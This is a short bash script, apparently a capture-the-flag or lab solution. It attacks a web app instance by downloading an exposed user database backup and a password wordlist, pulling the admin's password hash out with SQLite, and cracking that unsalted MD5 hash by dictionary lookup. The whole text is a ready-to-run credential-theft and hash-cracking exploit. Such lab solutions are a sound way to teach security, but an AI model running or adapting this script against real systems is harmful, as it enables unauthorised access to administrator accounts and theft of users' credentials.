#!/usr/bin/env bash
set -euo pipefail
BASE="${1:?usage: $0 https://<instance>-app.web.lms.itmo.xyz}"

jar="$(mktemp)"; dir="$(mktemp -d)"
curl -sS --retry 3 --retry-all-errors -c "$jar" -o "$dir/users.db" "$BASE/backups/users.db"
curl -sS --retry 3 --retry-all-errors -b "$jar" -o "$dir/wordlist.txt" "$BASE/training-passwords.txt"

hash="$(python -I -c '
import sqlite3,sys
c=sqlite3.connect(sys.argv[1])
print(c.execute("SELECT password_hash FROM users WHERE username=\"admin\"").fetchone()[0])
' "$dir/users.db")"
echo "admin hash = $hash"

python -I -c '
import hashlib,sys
target=sys.argv[1]
for line in open(sys.argv[2],encoding="utf-8",errors="replace"):
    pw=line.rstrip("\r\n")
    if hashlib.md5(pw.encode()).hexdigest()==target:
        print("FOUND:",pw); break
else: print("not found")
' "$hash" "$dir/wordlist.txt"
